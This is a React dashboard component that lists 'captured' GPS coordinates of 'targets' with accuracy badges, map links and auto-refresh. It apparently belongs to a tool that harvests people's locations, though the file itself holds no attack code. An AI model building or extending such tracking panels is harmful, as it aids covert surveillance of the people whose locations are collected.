import { useEffect, useState, useCallback } from 'react'
import { api, Location } from '../api/client'

export default function Locations() {
  const [locations, setLocations] = useState<Location[]>([])
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)

  const refresh = useCallback(async () => {
    try { setLocations(await api.locations()) } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 5000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const copy = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  if (loading) return <div className="flex justify-center py-20"><div className="animate-spin w-8 h-8 border-2 border-green-500 border-t-transparent rounded-full"></div></div>

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h2 className="text-2xl font-bold text-white">Locations</h2>
          <p className="text-sm text-gray-500 mt-1">{locations.length} GPS coordinates captured</p>
        </div>
        <div className="flex gap-2">
          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`px-3 py-1.5 rounded-lg text-xs font-medium ${autoRefresh ? 'bg-green-500/10 text-green-400' : 'bg-gray-800 text-gray-500'}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="px-3 py-1.5 bg-gray-800 text-gray-300 rounded-lg text-sm hover:bg-gray-700">🔄</button>
        </div>
      </div>

      {locations.length === 0 ? (
        <div className="text-center py-24 text-gray-600">
          <div className="text-6xl mb-4 opacity-20">📍</div>
          <h3 className="text-lg text-gray-400">No locations captured</h3>
          <p className="text-sm mt-2">GPS data appears when targets grant location access</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {locations.map(l => {
            const acc = l.accuracy ?? 999
            const accColor = acc < 10 ? 'text-green-400' : acc < 50 ? 'text-yellow-400' : 'text-red-400'
            const accLabel = acc < 10 ? 'High precision' : acc < 50 ? 'Medium precision' : 'Low precision'
            const accBg = acc < 10 ? 'bg-green-500/10' : acc < 50 ? 'bg-yellow-500/10' : 'bg-red-500/10'
            return (
              <div key={l.id} className="bg-gray-900 border border-gray-800 rounded-2xl p-5 hover:border-green-500/40 transition-all hover:shadow-lg hover:shadow-green-500/5">
                <div className="flex items-start justify-between">
                  <div className="text-2xl">📍</div>
                  <span className={`text-[10px] px-2 py-0.5 rounded-full ${accBg} ${accColor}`}>{accLabel}</span>
                </div>
                <div className="text-sm text-cyan-400 font-mono cursor-pointer mt-3 hover:underline" onClick={() => copy(`${l.latitude}, ${l.longitude}`)}>
                  {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}
                </div>
                <div className={`text-xs mt-1 ${accColor}`}>Accuracy: {acc}m</div>
                <div className="flex gap-2 mt-4">
                  <a href={l.maps_url} target="_blank" rel="noreferrer" className="flex-1 text-center text-xs text-green-400 bg-green-500/10 hover:bg-green-500/20 rounded-lg py-2 transition-colors">
                    🗺 Maps
                  </a>
                  <button onClick={() => copy(`${l.latitude}, ${l.longitude}`)} className="flex-1 text-center text-xs text-gray-400 bg-gray-800 hover:bg-gray-700 rounded-lg py-2 transition-colors">
                    📋 Copy
                  </button>
                </div>
                <div className="text-xs text-gray-600 mt-3">{new Date(l.created_at * 1000).toLocaleString()}</div>
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}
